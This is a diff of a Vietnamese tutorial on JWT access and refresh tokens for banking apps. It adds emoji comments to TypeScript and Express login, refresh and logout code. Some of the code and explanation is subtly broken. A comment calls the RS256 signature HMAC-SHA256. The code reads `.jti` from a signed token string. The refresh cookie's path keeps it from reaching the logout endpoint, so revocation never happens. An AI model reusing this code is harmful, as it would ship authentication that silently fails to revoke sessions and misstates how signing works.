@@ -98,49 +98,54 @@ Hệ thống authentication cho ngân hàng/chứng khoán yêu cầu **bảo m�
 **Access Token (Token Truy Cập):**
 
 ```typescript
-// Cấu trúc JWT Access Token
+// 🔑 Cấu trúc JWT Access Token (3 phần: Header.Payload.Signature)
 {
-  "header": {
-    "alg": "RS256",      // Thuật toán mã hóa (RSA + SHA256)
-    "typ": "JWT"
+  "header": {  // 📋 Phần 1: Metadata về token
+    "alg": "RS256",      // 🔐 Thuật toán mã hóa (RSA + SHA256 - asymmetric, an toàn cho banking)
+    "typ": "JWT"         // 📝 Loại token (JSON Web Token)
   },
-  "payload": {
-    "sub": "user123",    // User ID
-    "name": "John Doe",
-    "email": "john@example.com",
-    "role": "trader",    // Role: admin, trader, customer
-    "permissions": ["trade", "view_balance", "transfer"],
-    "iat": 1699999999,   // Issued At (thời điểm tạo)
-    "exp": 1700000899    // Expiry (hết hạn sau 15 phút)
+  "payload": {  // 📦 Phần 2: Dữ liệu user (claims - không mã hóa, chỉ Base64 encode)
+    "sub": "user123",    // 👤 User ID - Subject (identifier duy nhất)
+    "name": "John Doe",  // 📛 Tên user (hiển thị UI)
+    "email": "john@example.com",  // 📧 Email
+    "role": "trader",    // 🎭 Role: admin, trader, customer (phân quyền)
+    "permissions": ["trade", "view_balance", "transfer"],  // 🔑 Quyền cụ thể
+    "iat": 1699999999,   // ⏰ Issued At (thời điểm tạo - Unix timestamp)
+    "exp": 1700000899    // ⌛ Expiry (hết hạn sau 15 phút - Unix timestamp)
   },
-  "signature": "..."     // Chữ ký số (verify token không bị giả mạo)
+  "signature": "..."     // ✍️ Phần 3: Chữ ký số (verify token không bị giả mạo/sửa đổi)
+  // Signature = HMAC-SHA256(base64(header) + "." + base64(payload), secret)
 }
 
-// Đặc điểm:
-// ✅ Thời hạn ngắn: 5-15 phút
-// ✅ Lưu trong memory (JavaScript variable)
-// ✅ Gửi kèm mọi API request: Authorization: Bearer <token>
-// ✅ Chứa thông tin user (role, permissions)
-// ❌ KHÔNG lưu localStorage/sessionStorage (XSS risk)
+// 📌 Đặc điểm Access Token:
+// ✅ ⏱️ Thời hạn ngắn: 5-15 phút (giảm thiệt hại nếu bị đánh cắp)
+// ✅ 💾 Lưu trong memory (JavaScript variable - biến toàn cục hoặc state)
+// ✅ 📡 Gửi kèm mọi API request: Authorization: Bearer <token>
+// ✅ 📦 Chứa thông tin user (role, permissions - client không cần query lại)
+// ✅ 🔓 Payload KHÔNG mã hóa (chỉ Base64 - ai cũng đọc được)
+// ❌ 🚫 KHÔNG lưu localStorage/sessionStorage (XSS có thể đánh cắp)
+// ❌ 🚫 KHÔNG chứa sensitive data (password, credit card, SSN)
 ```
 
 **Refresh Token (Token Làm Mới):**
 
 ```typescript
-// Cấu trúc Refresh Token (thường là random string)
+// 🔄 Cấu trúc Refresh Token (thường là random string hoặc JWT đơn giản)
 {
-  "jti": "unique-token-id-abc123xyz",  // Token ID duy nhất
-  "sub": "user123",                    // User ID
-  "iat": 1699999999,                   // Issued At
-  "exp": 1702591999                    // Expiry (hết hạn sau 30 ngày)
+  "jti": "unique-token-id-abc123xyz",  // 🆔 Token ID duy nhất (JWT ID - để track/revoke)
+  "sub": "user123",                    // 👤 User ID (Subject)
+  "iat": 1699999999,                   // ⏰ Issued At (thời điểm tạo)
+  "exp": 1702591999                    // ⌛ Expiry (hết hạn sau 30 ngày - 2592000 giây)
 }
 
-// Đặc điểm:
-// ✅ Thời hạn dài: 7-30 ngày (hoặc vô thời hạn)
-// ✅ Lưu trong httpOnly Cookie (không đọc được bằng JS)
-// ✅ Chỉ dùng để lấy Access Token mới
-// ✅ Có thể revoke (thu hồi) từ server
-// ❌ KHÔNG gửi kèm API thường (chỉ gửi tới /refresh endpoint)
+// 📌 Đặc điểm Refresh Token:
+// ✅ ⏱️ Thời hạn dài: 7-30 ngày (hoặc vô thời hạn - UX tốt, không phải login liên tục)
+// ✅ 🍪 Lưu trong httpOnly Cookie (JS KHÔNG đọc được bằng document.cookie)
+// ✅ 🔄 Chỉ dùng để lấy Access Token mới (single purpose)
+// ✅ 🗄️ Lưu trong database (để có thể revoke/blacklist khi cần)
+// ✅ 🔒 Có thể revoke (thu hồi) từ server (logout, suspicious activity)
+// ❌ 🚫 KHÔNG gửi kèm API thường (chỉ gửi tới /auth/refresh endpoint)
+// ❌ 🚫 KHÔNG chứa nhiều thông tin (chỉ jti, sub, exp - minimal payload)
 ```
 
 **Tại Sao Cần 2 Token?**
@@ -185,43 +190,47 @@ Hệ thống authentication cho ngân hàng/chứng khoán yêu cầu **bảo m�
 // BƯỚC 1: User Login
 // ============================================
 
-// Frontend: Gửi username + password
+// 🌐 Frontend: Gửi username + password đến server
 async function login(username: string, password: string) {
   try {
     const response = await fetch('https://api.bank.com/auth/login', {
-      method: 'POST',
+      method: 'POST',  // 📮 HTTP POST method
       headers: {
-        'Content-Type': 'application/json',
+        'Content-Type': 'application/json',  // 📝 Gửi JSON data
       },
-      body: JSON.stringify({
-        username,
-        password,
+      body: JSON.stringify({  // 📦 Payload gửi lên server
+        username,  // 👤 Username hoặc email
+        password,  // 🔑 Password (sẽ hash bằng bcrypt ở server)
         // Optional: MFA code, device fingerprint
-        mfaCode: '123456',
-        deviceId: getDeviceFingerprint(),
+        mfaCode: '123456',  // 🔢 MFA/2FA code (Google Authenticator, SMS OTP)
+        deviceId: getDeviceFingerprint(),  // 🖥️ Device fingerprint (detect thiết bị lạ)
       }),
-      credentials: 'include', // Quan trọng: Cho phép gửi/nhận cookie
+      credentials: 'include', // ⚠️ QUAN TRỌNG: Cho phép gửi/nhận cookie (refresh token)
+      // credentials: 'include' → browser tự động gửi cookies với request
+      // và lưu Set-Cookie response vào browser
     });
 
-    if (!response.ok) {
+    if (!response.ok) {  // ❌ Nếu login thất bại (4xx, 5xx status)
       throw new Error('Login failed');
     }
 
-    const data = await response.json();
+    const data = await response.json();  // 📦 Parse JSON response
     
+    // 📝 Response structure từ server:
     // {
-    //   accessToken: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",
-    //   user: { id: "123", name: "John", role: "trader" },
-    //   expiresIn: 900  // 15 phút (900 giây)
+    //   accessToken: "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9...",  // 🔑 Access Token (JWT string)
+    //   user: { id: "123", name: "John", role: "trader" },  // 👤 User info (hiển thị UI)
+    //   expiresIn: 900  // ⏰ 15 phút (900 giây - để tính refresh time)
     // }
     
-    // Refresh Token được server tự động set vào httpOnly cookie
+    // 🍪 Refresh Token được server tự động set vào httpOnly cookie:
     // Set-Cookie: refreshToken=xyz...; HttpOnly; Secure; SameSite=Strict; Max-Age=2592000
+    // → Browser tự động lưu cookie này (JS không thấy được)
     
-    return data;
+    return data;  // ✅ Trả về accessToken + user info
   } catch (error) {
-    console.error('Login error:', error);
-    throw error;
+    console.error('Login error:', error);  // 🚨 Log lỗi ra console
+    throw error;  // ⚠️ Throw lại để component xử lý (hiển thị lỗi cho user)
   }
 }
 
@@ -229,112 +238,140 @@ async function login(username: string, password: string) {
 // BƯỚC 2: Server Xử Lý Login
 // ============================================
 
-// Backend (Node.js/Express)
+// 🔧 Backend (Node.js/Express) - Xử lý login request
 app.post('/auth/login', async (req, res) => {
-  const { username, password, mfaCode } = req.body;
+  const { username, password, mfaCode } = req.body;  // 📦 Lấy data từ request body
   
-  // 1. Verify username + password (bcrypt)
-  const user = await db.findUserByUsername(username);
+  // 🔹 BƯớc 1: Verify username + password (bcrypt hash comparison)
+  const user = await db.findUserByUsername(username);  // 🔍 Tìm user trong database
   if (!user || !await bcrypt.compare(password, user.passwordHash)) {
-    return res.status(401).json({ error: 'Invalid credentials' });
+    // bcrypt.compare() so sánh password plaintext với hash trong DB
+    // → An toàn, không lưu password gốc
+    return res.status(401).json({ error: 'Invalid credentials' });  // ❌ 401 Unauthorized
   }
   
-  // 2. Verify MFA (Multi-Factor Authentication)
-  if (!verifyMFA(user, mfaCode)) {
-    return res.status(401).json({ error: 'Invalid MFA code' });
+  // 🔹 BƯớc 2: Verify MFA (Multi-Factor Authentication - xác thực 2 lớp)
+  if (!verifyMFA(user, mfaCode)) {  // ✅ Kiểm tra OTP/2FA code
+    // verifyMFA() kiểm tra TOTP (Google Authenticator) hoặc SMS OTP
+    return res.status(401).json({ error: 'Invalid MFA code' });  // ❌ MFA sai
   }
   
-  // 3. Check account status (not locked, not suspended)
+  // 🔹 BƯớc 3: Check account status (không bị khóa, không bị tạm ngưng)
   if (user.isLocked || user.isSuspended) {
-    return res.status(403).json({ error: 'Account locked' });
+    // isLocked: Quá nhiều lần login sai (brute force protection)
+    // isSuspended: Admin tạm ngưng account (vi phạm, fraud detection)
+    return res.status(403).json({ error: 'Account locked' });  // ❌ 403 Forbidden
   }
   
-  // 4. Generate Access Token (15 phút)
-  const accessToken = jwt.sign(
-    {
-      sub: user.id,
-      name: user.name,
-      email: user.email,
-      role: user.role,
-      permissions: user.permissions,
+  // 🔹 BƯớc 4: Generate Access Token (JWT - 15 phút)
+  const accessToken = jwt.sign(  // 🔐 jwt.sign() tạo JWT token
+    {  // 📦 Payload (claims) - thông tin user (Base64 encoded, KHÔNG mã hóa)
+      sub: user.id,  // 🆔 Subject - User ID duy nhất
+      name: user.name,  // 📛 Tên hiển thị
+      email: user.email,  // 📧 Email
+      role: user.role,  // 🎭 Role: admin/trader/customer (phân quyền)
+      permissions: user.permissions,  // 🔑 Quyền cụ thể (RBAC - Role-Based Access Control)
     },
-    process.env.ACCESS_TOKEN_SECRET,  // Private key (RSA)
-    { expiresIn: '15m' }  // 15 phút
+    process.env.ACCESS_TOKEN_SECRET,  // 🔑 Private key (RSA) - biến môi trường, KHÔNG commit lên Git
+    { expiresIn: '15m' }  // ⌛ 15 phút (ngắn - giảm thiệt hại nếu leak)
   );
   
-  // 5. Generate Refresh Token (30 ngày)
+  // 🔹 BƯớc 5: Generate Refresh Token (JWT - 30 ngày)
   const refreshToken = jwt.sign(
-    {
-      jti: uuidv4(),  // Unique token ID
-      sub: user.id,
+    {  // 📦 Payload tối thiểu (chỉ cần jti và sub)
+      jti: uuidv4(),  // 🆔 JWT ID - unique identifier để track/revoke token
+      sub: user.id,  // 👤 User ID
     },
-    process.env.REFRESH_TOKEN_SECRET,
-    { expiresIn: '30d' }  // 30 ngày
+    process.env.REFRESH_TOKEN_SECRET,  // 🔑 Khóa riêng cho refresh token (KHÁC với access token)
+    { expiresIn: '30d' }  // ⌛ 30 ngày (dài - UX tốt, user không phải login liên tục)
   );
   
-  // 6. Lưu Refresh Token vào database (để có thể revoke sau)
+  // 🔹 BƯớc 6: Lưu Refresh Token vào database (để có thể revoke sau)
   await db.saveRefreshToken({
-    tokenId: refreshToken.jti,
-    userId: user.id,
-    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
-    deviceInfo: req.headers['user-agent'],
-    ipAddress: req.ip,
+    tokenId: refreshToken.jti,  // 🆔 JWT ID (unique)
+    userId: user.id,  // 👤 User ID (foreign key)
+    expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),  // ⌛ Expiry date
+    deviceInfo: req.headers['user-agent'],  // 🖥️ Thông tin thiết bị (browser, OS)
+    ipAddress: req.ip,  // 🌐 IP address (geo-location, fraud detection)
   });
+  // → Lưu vào DB để: revoke khi logout, detect multiple logins, audit trail
   
-  // 7. Set Refresh Token vào httpOnly Cookie
+  // 🔹 BƯớc 7: Set Refresh Token vào httpOnly Cookie (🛡️ Bảo mật cao nhất)
   res.cookie('refreshToken', refreshToken, {
-    httpOnly: true,    // JavaScript không đọc được (chống XSS)
-    secure: true,      // Chỉ gửi qua HTTPS
-    sameSite: 'strict', // Chống CSRF
-    maxAge: 30 * 24 * 60 * 60 * 1000,  // 30 ngày
-    path: '/auth/refresh',  // Chỉ gửi tới endpoint refresh
+    httpOnly: true,    // ⚠️ QUAN TRỌNG: JavaScript KHÔNG đọc được (chống XSS)
+    // document.cookie sẽ KHÔNG thấy cookie này
+    // Chỉ browser gửi tự động với requests
+    
+    secure: true,      // 🔒 Chỉ gửi qua HTTPS (không qua HTTP - chống MITM attack)
+    // Production MUST có, dev localhost có thể tắt
+    
+    sameSite: 'strict', // 🛡️ Chống CSRF (Cross-Site Request Forgery)
+    // 'strict': KHÔNG gửi cookie khi navigate từ site khác
+    // 'lax': Gửi cookie khi GET navigation (moderate security)
+    // 'none': Gửi mọi cross-site (least secure, cần secure: true)
+    
+    maxAge: 30 * 24 * 60 * 60 * 1000,  // ⌛ 30 ngày (milliseconds)
+    // Browser tự động xóa cookie sau 30 ngày
+    
+    path: '/auth/refresh',  // 📋 Chỉ gửi cookie tới endpoint này
+    // Giảm exposure - không gửi tới mọi API endpoint
+    // Chỉ có POST /auth/refresh mới nhận được cookie này
   });
+  // → Browser tự động lưu cookie và gửi kèm requests tới /auth/refresh
   
-  // 8. Log login event (audit trail)
+  // 🔹 BƯớc 8: Log login event (audit trail - vết vết hoạt động)
   await logEvent({
-    type: 'LOGIN_SUCCESS',
-    userId: user.id,
-    ipAddress: req.ip,
-    deviceInfo: req.headers['user-agent'],
-    timestamp: new Date(),
+    type: 'LOGIN_SUCCESS',  // 📝 Loại event (LOGIN_SUCCESS, LOGIN_FAILED, LOGOUT, etc.)
+    userId: user.id,  // 👤 User ID
+    ipAddress: req.ip,  // 🌐 IP address (để detect unusual locations)
+    deviceInfo: req.headers['user-agent'],  // 🖥️ Device info (browser, OS)
+    timestamp: new Date(),  // ⏰ Thời gian
   });
+  // → Audit trail giúp: compliance (kế toán), security (detect breach), debugging
   
-  // 9. Return Access Token về client
+  // 🔹 BƯớc 9: Return Access Token về client (qua response body JSON)
   res.json({
-    accessToken,
-    user: {
+    accessToken,  // 🔑 JWT string - client lưu trong memory
+    user: {  // 👤 User info (hiển thị UI - không sensitive)
       id: user.id,
       name: user.name,
       email: user.email,
       role: user.role,
     },
-    expiresIn: 900,  // 15 phút
+    expiresIn: 900,  // ⏰ 15 phút = 900 giây (client dùng để tính thời điểm refresh)
   });
+  // ✅ Success response: 200 OK + JSON body
+  // 🍪 Refresh token đã set vào cookie ở bƯớc 7
 });
 
 // ============================================
 // BƯỚC 3: Frontend Lưu Access Token
 // ============================================
 
-// Store Access Token in memory (JavaScript variable)
-let accessToken: string | null = null;
+// 💾 Store Access Token in memory (JavaScript variable - biến toàn cục)
+// ⚠️ KHÔNG dùng localStorage/sessionStorage (XSS có thể đọc được)
+let accessToken: string | null = null;  // 🔑 Lưu trong RAM, mất khi refresh page
 
 async function handleLogin(username: string, password: string) {
-  const response = await login(username, password);
+  const response = await login(username, password);  // 📡 Gọi API login
   
-  // Lưu Access Token trong memory
-  accessToken = response.accessToken;
+  // 🔹 Lưu Access Token trong memory (biến toàn cục)
+  accessToken = response.accessToken;  // 🔑 JWT string
+  // → Mất khi user refresh page (an toàn hơn localStorage)
+  // → Phải lấy lại từ refresh token khi refresh page
   
-  // Lưu user info (không sensitive) vào localStorage
+  // 🔹 Lưu user info (KHÔNG sensitive) vào localStorage
   localStorage.setItem('user', JSON.stringify(response.user));
+  // → Hiển thị tên user khi refresh page (trước khi lấy token mới)
+  // → OK vì không chứa sensitive data (không có password, token)
   
-  // Redirect to dashboard
-  window.location.href = '/dashboard';
+  // 🔹 Redirect to dashboard
+  window.location.href = '/dashboard';  // 🎯 Chuyển sang trang chính
 }
 
-// ❌ KHÔNG BAO GIỜ LÀM NHƯ NÀY:
-// localStorage.setItem('accessToken', token);  // XSS risk!
-// sessionStorage.setItem('accessToken', token); // Vẫn XSS risk!
+// ❌ ⚠️ KHÔNG BAO GIỜ LÀM NHƯ NÀY:
+// localStorage.setItem('accessToken', token);  // ❌ XSS có thể đọc: document.cookie, localStorage
+// sessionStorage.setItem('accessToken', token); // ❌ Vẫn XSS risk (JS đọc được)
 ```
 
 ---
@@ -343,72 +380,84 @@ async function handleLogin(username: string, password: string) {
 
 ```typescript
 // ============================================
-// Frontend: Gọi API với Access Token
+// 🌐 Frontend: Gọi API với Access Token
 // ============================================
 
-// Helper function: Tự động attach Access Token
+// 🛠️ Helper function: Tự động attach Access Token vào mọi API request
 async function apiCall(url: string, options: RequestInit = {}) {
-  // Nếu Access Token hết hạn → refresh trước
-  if (isTokenExpired(accessToken)) {
-    await refreshAccessToken();
+  // ✅ Kiểm tra nếu Access Token hết hạn → refresh trước
+  if (isTokenExpired(accessToken)) {  // ⏰ Check expiry time (JWT exp claim)
+    await refreshAccessToken();  // 🔄 Lấy token mới từ refresh token
   }
   
-  // Gửi request với Access Token
+  // 📡 Gửi request với Access Token trong header
   const response = await fetch(url, {
-    ...options,
+    ...options,  // 📦 Spread các options hiện có (method, body, etc.)
     headers: {
-      ...options.headers,
-      'Authorization': `Bearer ${accessToken}`,  // Gửi token
+      ...options.headers,  // 📋 Giữ lại headers hiện có
+      'Authorization': `Bearer ${accessToken}`,  // 🔑 Thêm Authorization header
+      // "Bearer" là chuẩn OAuth 2.0 cho JWT tokens
     },
-    credentials: 'include',  // Gửi cookies (refresh token)
+    credentials: 'include',  // 🍪 Gửi cookies (refresh token - nếu cần)
   });
   
-  // Nếu 401 Unauthorized → token invalid, logout
+  // ⚠️ Nếu 401 Unauthorized → token invalid (expired/revoked), logout
   if (response.status === 401) {
-    await logout();
-    window.location.href = '/login';
-    throw new Error('Unauthorized');
+    await logout();  // 🚪 Xóa tokens, clear state
+    window.location.href = '/login';  // 🔄 Redirect về login page
+    throw new Error('Unauthorized');  // ❌ Throw error để stop execution
   }
   
-  return response.json();
+  return response.json();  // 📦 Parse JSON response
 }
 
-// Usage: Gọi API lấy số dư tài khoản
+// 📝 Usage: Gọi API lấy số dư tài khoản
 const balance = await apiCall('https://api.bank.com/account/balance');
 console.log(balance); // { balance: 1000000, currency: 'VND' }
 
 // ============================================
-// Backend: Verify Access Token
+// 🔧 Backend: Verify Access Token (Middleware)
 // ============================================
 
-// Middleware: Verify JWT token
+// 🛡️ Middleware: Verify JWT token trước khi vào protected routes
 function authenticateToken(req, res, next) {
-  // 1. Lấy token từ header
-  const authHeader = req.headers['authorization'];
-  const token = authHeader && authHeader.split(' ')[1];  // "Bearer <token>"
+  // 🔹 Bước 1: Lấy token từ Authorization header
+  const authHeader = req.headers['authorization'];  // "Bearer eyJhbG..."
+  const token = authHeader && authHeader.split(' ')[1];  // 🔪 Tách "Bearer" + token
+  // authHeader.split(' ') → ["Bearer", "eyJhbG..."]
+  // [1] → lấy phần token (index 1)
   
-  if (!token) {
-    return res.status(401).json({ error: 'No token provided' });
+  if (!token) {  // ❌ Nếu không có token
+    return res.status(401).json({ error: 'No token provided' });  // 401 Unauthorized
   }
   
-  // 2. Verify token
+  // 🔹 Bước 2: Verify token với secret key
   jwt.verify(token, process.env.ACCESS_TOKEN_SECRET, (err, user) => {
-    if (err) {
-      // Token expired hoặc invalid
-      return res.status(403).json({ error: 'Invalid token' });
+    // jwt.verify() kiểm tra:
+    // - Signature hợp lệ (không bị sửa đổi)
+    // - Chưa hết hạn (exp claim)
+    // - Issuer đúng (nếu có iss claim)
+    
+    if (err) {  // ❌ Token expired hoặc invalid
+      // err.name === 'TokenExpiredError' → hết hạn
+      // err.name === 'JsonWebTokenError' → sai signature/format
+      return res.status(403).json({ error: 'Invalid token' });  // 403 Forbidden
     }
     
-    // 3. Attach user info vào request
-    req.user = user;  // { sub: "123", role: "trader", ... }
-    next();
+    // ✅ Token hợp lệ
+    // 🔹 Bước 3: Attach user info vào request object
+    req.user = user;  // 👤 { sub: "123", role: "trader", permissions: [...] }
+    // → Downstream routes có thể dùng req.user để phân quyền
+    next();  // ➡️ Tiếp tục vào route handler
   });
 }
 
-// Protected route
+// 🛡️ Protected route - Yêu cầu authentication
 app.get('/account/balance', authenticateToken, async (req, res) => {
-  const userId = req.user.sub;
-  const balance = await db.getBalance(userId);
-  res.json(balance);
+  // authenticateToken middleware chạy trước → đảm bảo req.user tồn tại
+  const userId = req.user.sub;  // 🆔 Lấy User ID từ JWT payload
+  const balance = await db.getBalance(userId);  // 💰 Query database
+  res.json(balance);  // 📤 Return JSON response
 });
 ```
 
@@ -418,113 +467,121 @@ app.get('/account/balance', authenticateToken, async (req, res) => {
 
 ```typescript
 // ============================================
-// Frontend: Refresh Access Token
+// 🔄 Frontend: Refresh Access Token (Lấy token mới khi hết hạn)
 // ============================================
 
 async function refreshAccessToken(): Promise<void> {
   try {
     const response = await fetch('https://api.bank.com/auth/refresh', {
-      method: 'POST',
-      credentials: 'include',  // Gửi httpOnly cookie (refreshToken)
+      method: 'POST',  // 📮 HTTP POST
+      credentials: 'include',  // 🍪 QUAN TRỌNG: Gửi httpOnly cookie (refreshToken)
+      // Browser tự động gửi cookie "refreshToken" kèm request
       headers: {
         'Content-Type': 'application/json',
       },
     });
     
-    if (!response.ok) {
+    if (!response.ok) {  // ❌ Nếu refresh thất bại (401, 403)
       // Refresh token hết hạn hoặc invalid → logout
       throw new Error('Refresh token expired');
     }
     
-    const data = await response.json();
+    const data = await response.json();  // 📦 Parse response
+    // 📝 Response structure:
     // {
-    //   accessToken: "new-token...",
-    //   expiresIn: 900
+    //   accessToken: "new-token...",  // 🔑 Access Token mới (JWT string)
+    //   expiresIn: 900  // ⏰ 15 phút
     // }
     
-    // Cập nhật Access Token mới
-    accessToken = data.accessToken;
+    // ✅ Cập nhật Access Token mới vào memory
+    accessToken = data.accessToken;  // 🔄 Ghi đè token cũ
     
-    console.log('Access token refreshed');
+    console.log('Access token refreshed');  // 📝 Log success
   } catch (error) {
-    console.error('Refresh failed:', error);
+    console.error('Refresh failed:', error);  // 🚨 Log lỗi
     
-    // Logout user
-    await logout();
-    window.location.href = '/login';
+    // 🚪 Logout user (refresh token không còn hợp lệ)
+    await logout();  // Xóa tokens, clear state
+    window.location.href = '/login';  // 🔄 Redirect về login
   }
 }
 
-// Auto-refresh token trước khi hết hạn
+// ⏰ Auto-refresh token trước khi hết hạn (silent refresh)
 function startTokenRefreshTimer() {
-  // Refresh token trước 1 phút khi hết hạn
-  const refreshTime = (15 - 1) * 60 * 1000;  // 14 phút
+  // 🕒 Refresh token trước 1 phút khi hết hạn (14 phút)
+  const refreshTime = (15 - 1) * 60 * 1000;  // 14 phút = 840000ms
+  // → Refresh ở phút 14, trước khi hết hạn ở phút 15
   
-  setInterval(async () => {
-    await refreshAccessToken();
+  setInterval(async () => {  // 🔄 Lặp lại mỗi 14 phút
+    await refreshAccessToken();  // Gọi API refresh
   }, refreshTime);
 }
 
-// Gọi khi app khởi động
-startTokenRefreshTimer();
+// 🚀 Gọi khi app khởi động (App.tsx, main.tsx)
+startTokenRefreshTimer();  // Bắt đầu timer
 
 // ============================================
-// Backend: Refresh Token Endpoint
+// 🔧 Backend: Refresh Token Endpoint
 // ============================================
 
 app.post('/auth/refresh', async (req, res) => {
-  // 1. Lấy Refresh Token từ httpOnly cookie
-  const refreshToken = req.cookies.refreshToken;
+  // 🔹 BƯớc 1: Lấy Refresh Token từ httpOnly cookie
+  const refreshToken = req.cookies.refreshToken;  // 🍪 Browser tự động gửi cookie
   
-  if (!refreshToken) {
+  if (!refreshToken) {  // ❌ Nếu không có cookie (user chưa login)
     return res.status(401).json({ error: 'No refresh token' });
   }
   
   try {
-    // 2. Verify Refresh Token
+    // 🔹 BƯớc 2: Verify Refresh Token
     const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
+    // → Kiểm tra signature, expiry, format
+    // → decoded = { jti: "...", sub: "user123", iat: ..., exp: ... }
     
-    // 3. Check token trong database (chưa bị revoke?)
-    const tokenRecord = await db.findRefreshToken(decoded.jti);
-    if (!tokenRecord || tokenRecord.isRevoked) {
+    // 🔹 BƯớc 3: Check token trong database (chưa bị revoke?)
+    const tokenRecord = await db.findRefreshToken(decoded.jti);  // 🔍 Tìm theo JWT ID
+    if (!tokenRecord || tokenRecord.isRevoked) {  // ❌ Token bị revoke (blacklist)
+      // isRevoked = true khi: logout, suspicious activity, password change
       return res.status(403).json({ error: 'Token revoked' });
     }
     
-    // 4. Check user vẫn còn active
-    const user = await db.findUserById(decoded.sub);
-    if (!user || user.isLocked) {
+    // 🔹 BƯớc 4: Check user vẫn còn active
+    const user = await db.findUserById(decoded.sub);  // 🔍 Tìm user
+    if (!user || user.isLocked) {  // ❌ User không tồn tại hoặc bị khóa
       return res.status(403).json({ error: 'User inactive' });
     }
     
-    // 5. Generate Access Token mới
+    // 🔹 BƯớc 5: Generate Access Token mới (15 phút)
     const newAccessToken = jwt.sign(
-      {
+      {  // 📦 Payload (fresh data từ database)
         sub: user.id,
-        name: user.name,
+        name: user.name,  // Có thể đã thay đổi từ lần login
         email: user.email,
-        role: user.role,
+        role: user.role,  // Có thể admin đã thay đổi quyền
         permissions: user.permissions,
       },
-      process.env.ACCESS_TOKEN_SECRET,
-      { expiresIn: '15m' }
+      process.env.ACCESS_TOKEN_SECRET,  // 🔑 Private key
+      { expiresIn: '15m' }  // ⌛ 15 phút
     );
     
-    // 6. Log refresh event
+    // 🔹 BƯớc 6: Log refresh event (audit trail)
     await logEvent({
-      type: 'TOKEN_REFRESH',
-      userId: user.id,
-      tokenId: decoded.jti,
-      timestamp: new Date(),
+      type: 'TOKEN_REFRESH',  // 📝 Event type
+      userId: user.id,  // 👤 User ID
+      tokenId: decoded.jti,  // 🆔 Token ID
+      timestamp: new Date(),  // ⏰ Thời gian
     });
     
-    // 7. Return Access Token mới
+    // 🔹 BƯớc 7: Return Access Token mới
     res.json({
-      accessToken: newAccessToken,
-      expiresIn: 900,
+      accessToken: newAccessToken,  // 🔑 JWT string
+      expiresIn: 900,  // ⏰ 15 phút
     });
+    // ✅ Refresh token vẫn giữ nguyên trong cookie (không thay đổi)
+    // ⚠️ Nếu muốn Token Rotation: generate refresh token mới ở đây
     
   } catch (error) {
-    // Token expired hoặc invalid
+    // ❌ Token expired hoặc invalid signature
     return res.status(403).json({ error: 'Invalid refresh token' });
   }
 });
@@ -536,75 +593,82 @@ app.post('/auth/refresh', async (req, res) => {
 
 ```typescript
 // ============================================
-// Frontend: Logout
+// 🚪 Frontend: Logout (Xóa tokens, clear state)
 // ============================================
 
 async function logout(): Promise<void> {
   try {
-    // 1. Gọi API logout (revoke refresh token)
+    // 🔹 BƯớc 1: Gọi API logout (revoke refresh token trên server)
     await fetch('https://api.bank.com/auth/logout', {
-      method: 'POST',
-      credentials: 'include',  // Gửi refreshToken cookie
+      method: 'POST',  // 📮 HTTP POST
+      credentials: 'include',  // 🍪 Gửi refreshToken cookie
     });
+    // → Server sẽ revoke token trong database (blacklist)
     
-    // 2. Xóa Access Token khỏi memory
-    accessToken = null;
+    // 🔹 BƯớc 2: Xóa Access Token khỏi memory
+    accessToken = null;  // 🗄️ Set null (garbage collected)
     
-    // 3. Xóa user info khỏi localStorage
-    localStorage.removeItem('user');
+    // 🔹 BƯớc 3: Xóa user info khỏi localStorage
+    localStorage.removeItem('user');  // 🗄️ Xóa user data
     
-    // 4. Clear any cached data
-    sessionStorage.clear();
+    // 🔹 BƯớc 4: Clear any cached data
+    sessionStorage.clear();  // 🧹 Xóa tất cả session data
+    // → Xóa cached API responses, temporary data
     
-    // 5. Redirect to login
-    window.location.href = '/login';
+    // 🔹 BƯớc 5: Redirect to login
+    window.location.href = '/login';  // 🔄 Chuyển về trang login
     
   } catch (error) {
-    console.error('Logout error:', error);
-    // Vẫn redirect về login dù có lỗi
+    console.error('Logout error:', error);  // 🚨 Log lỗi
+    // ⚠️ Vẫn redirect về login dù có lỗi (fail-safe)
     window.location.href = '/login';
   }
 }
 
 // ============================================
-// Backend: Logout Endpoint
+// 🔧 Backend: Logout Endpoint (Revoke tokens)
 // ============================================
 
 app.post('/auth/logout', async (req, res) => {
-  // 1. Lấy Refresh Token từ cookie
-  const refreshToken = req.cookies.refreshToken;
+  // 🔹 BƯớc 1: Lấy Refresh Token từ cookie
+  const refreshToken = req.cookies.refreshToken;  // 🍪 httpOnly cookie
   
-  if (refreshToken) {
+  if (refreshToken) {  // ✅ Nếu có cookie (user đang login)
     try {
-      // 2. Decode token
+      // 🔹 BƯớc 2: Decode token để lấy JWT ID
       const decoded = jwt.verify(refreshToken, process.env.REFRESH_TOKEN_SECRET);
+      // → decoded = { jti: "...", sub: "user123", ... }
       
-      // 3. Revoke token trong database (blacklist)
-      await db.revokeRefreshToken(decoded.jti);
+      // 🔹 BƯớc 3: Revoke token trong database (blacklist)
+      await db.revokeRefreshToken(decoded.jti);  // 🗄️ Set isRevoked = true
+      // → Token không thể dùng để refresh nữa
+      // → Nếu hacker đánh cắp cookie, không dùng được
       
-      // 4. Log logout event
+      // 🔹 BƯớc 4: Log logout event (audit trail)
       await logEvent({
-        type: 'LOGOUT',
-        userId: decoded.sub,
-        tokenId: decoded.jti,
-        timestamp: new Date(),
+        type: 'LOGOUT',  // 📝 Event type
+        userId: decoded.sub,  // 👤 User ID
+        tokenId: decoded.jti,  // 🆔 Token ID
+        timestamp: new Date(),  // ⏰ Thời gian
       });
+      // → Tracking user activities, compliance
       
     } catch (error) {
-      console.error('Logout error:', error);
+      console.error('Logout error:', error);  // 🚨 Log lỗi (token invalid/expired - OK)
     }
   }
   
-  // 5. Xóa Refresh Token cookie
-  res.clearCookie('refreshToken', {
-    httpOnly: true,
+  // 🔹 BƯớc 5: Xóa Refresh Token cookie khỏi browser
+  res.clearCookie('refreshToken', {  // 🗄️ Xóa cookie
+    httpOnly: true,  // ⚠️ Phải trùng với lúc set cookie
     secure: true,
     sameSite: 'strict',
-    path: '/auth/refresh',
+    path: '/auth/refresh',  // ⚠️ Path phải trùng khớp
   });
+  // → Browser xóa cookie ngay lập tức
   
-  // 6. Return success
-  res.json({ message: 'Logged out successfully' });
